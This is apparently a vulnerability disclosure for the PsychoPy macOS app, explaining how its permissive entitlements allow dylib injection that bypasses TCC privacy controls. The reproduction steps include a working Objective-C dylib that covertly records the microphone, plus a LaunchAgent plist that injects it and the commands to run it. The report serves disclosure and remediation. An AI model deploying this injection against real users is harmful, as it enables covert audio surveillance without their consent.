# TCC Bypass via Dylib Injection

## Description
The PsychoPy client contains overly permissive entitlements (Such as `com.apple.security.cs.allow-dyld-environment-variables`, `com.apple.security.cs.disable-library-validation`, `com.apple.security.get-task-allow`, etc.) that enable code injection through methods such as `DYLD_INSERT_LIBRARY injection` and `Dylib hijacking`. Attackers can inject malicious dylibs into the PsychoPy process, compromising the application's integrity and inheriting PsychoPy's access to bypass `Transparency, Consent, and Control (TCC)`.

PsychoPy, as experimental psychology software, requires users to approve TCC permissions for accessing sensitive components such as the `camera` and `microphone`. These permissions are designed to protect user privacy by preventing unauthorized access to sensitive data and hardware components, even from a macOS root account. However, due to the overly permissive entitlements, attackers can exploit the application's approved TCC permissions through code injection. Any injected dylib inherits PsychoPy's TCC permissions, effectively bypassing macOS's privacy protections.


## Impact

With these dangerous entitlements, TCC bypass can be achieved by DYLD_INSERT_LIBRARY injection, presenting significant business impacts:

- `Privacy Breach`: Attackers who successfully exploit these entitlements can access the user's camera, microphone, and USB devices without additional prompts.
- `Security Compromise`: Malicious code can be executed within PsychoPy's context, inheriting all privileges and permissions granted to it, while bypassing macOS's built-in - security controls despite hardened runtime being enabled.
- `Data Security`: Unauthorized access to hardware enables covert surveillance, potentially compromising user privacy at any time.

These dangerous entitlements nullify the security benefits of hardened runtime.


## Reproduction

1. Download the PsychoPy app from the official release and use the `codesign` utility to inspect its code signing information and entitlements. While PsychoPy has `Hardened Runtime` enabled, its dangerous entitlements leave it vulnerable to code injection. Additionally, as experimental psychology software, PsychoPy requires powerful TCC permissions for camera and microphone access. PsychoPy may request access to other resources as needed. While even the root account cannot access these components without user approval, an attacker can bypass TCC and access them without user approval or awareness.

```bash
adler@adlers-Mac-mini /Applications % codesign -dv --entitlement :- /Applications/PsychoPy.app | xmllint --format -
Executable=/Applications/PsychoPy.app/Contents/MacOS/PsychoPy
Identifier=org.opensciencetools.psychopy
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=777 flags=0x10000(runtime) hashes=13+7 location=embedded
Signature size=9083
Timestamp=Oct 25, 2024 at 6:12:28 AM
Info.plist entries=25
TeamIdentifier=NM3SX67P2X
Runtime Version=11.3.0
Sealed Resources version=2 rules=13 files=24661
Internal requirements count=1 size=192
warning: Specifying ':' in the path is deprecated and will not work in a future release
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>com.apple.security.automation.apple-events</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key>
    <true/>
    <key>com.apple.security.cs.allow-jit</key>
    <true/>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.device.microphone</key>
    <true/>
    <key>com.apple.security.device.usb</key>
    <true/>
    <key>com.apple.security.get-task-allow</key>
    <true/>
    <key>com.apple.security.network.client</key>
    <true/>
    <key>com.apple.security.network.server</key>
    <true/>
  </dict>
</plist>
```

2. Create a custom dylib to access the TCC-protected microphone, record for a few seconds, and save as `/tmp/recorded.m4a`.

```c
#include <stdio.h>
#include <syslog.h>
#import <AVFoundation/AVFoundation.h>


//class interface declaration
@interface AudioSnap : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureAudioFileOutput *audioFileOutput;
@property (strong, nonatomic) AVCaptureSession *session;

-(void)record;
@end

//class implementation
@implementation AudioSnap

-(void)record {
    //grab default device
    AVCaptureDevice* device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];

    //init session and output file obj
    self.session = [[AVCaptureSession alloc] init];

    //init audio input
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:nil];

    //init audio output
    self.audioFileOutput = [[AVCaptureAudioFileOutput alloc] init];

    //add input and output to session
    [self.session addInput:input];
    [self.session addOutput:self.audioFileOutput];

    //do the capture
    [self.session startRunning];
    [self.audioFileOutput startRecordingToOutputFileURL: [NSURL fileURLWithPath:@"/tmp/recorded.m4a"] outputFileType:AVFileTypeAppleM4A recordingDelegate:self];

    //stop recoding after 15 seconds
    [NSTimer scheduledTimerWithTimeInterval:15 target:self selector:@selector(stopRecording:) userInfo:nil repeats:NO];
}

-(void)stopRecording:(int)sigNum {
    //stop recording
    [self.audioFileOutput stopRecording];
}

-(void)captureOutput:(AVCaptureFileOutput *)captureOutput
    didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
    fromConnections:(NSArray *)connections
    error:(NSError *)error {

    //stop session & exit
    [self.session stopRunning];
    exit(0);
}
@end


__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
    NSLog(@"[+] dylib injected!\n");
    AudioSnap* as = [[AudioSnap alloc] init];
    [as record];
    [[NSRunLoop currentRunLoop] run];
}
```

Compile the dylib:

```bash
adler@adlers-Mac-mini tcc-exp % gcc -dynamiclib -framework Foundation -framework AVFoundation tcc_microphone_dylib.m -o tcc_microphone_dylib.dylib
```

3. Create a plist file named `com.psychopy.launcher.plist` under `~/Library/LaunchAgent/`. This file specifies the DYLD_INSERT_LIBRARIES environment variable, the program and its arguments, and the output file location.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.psychopy.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/Users/adler/tcc-exp/tcc_microphone_dylib.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
          <string>/Applications/PsychoPy.app/Contents/MacOS/PsychoPy</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/psychopy.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/psychopy.log</string>
</dict>
</plist>
```

4. Run the LaunchAgent with the command `launchctl load ~/Library/LaunchAgent/com.psychopy.launcher.plist`, and verify the saved audio file `/tmp/recorded.m4a` and output file `/tmp/psychopy.log`.


## Recommendation

For reference, similar vulnerabilities have been observed in other well-known applications, where overly permissive entitlements resulted in TCC bypass via dylib injection:

- CVE-2020-24259: Signal TCC bypass
- CVE-2023-26818: Telegram TCC bypass

While dylib injection alone may not always be classified as a vulnerability, when combined with unnecessary entitlements and TCC bypass capabilities, it will be considered a vulnerability as the security risks are significantly elevated. This is especially concerning for PsychoPy and similar applications that are granted multiple powerful TCC permissions, making them prime targets for attackers seeking unauthorized access to sensitive private information and hardware components.

It is recommended to review minimum required entitlements and TCC permissions, and remove unnecessary ones accordingly.
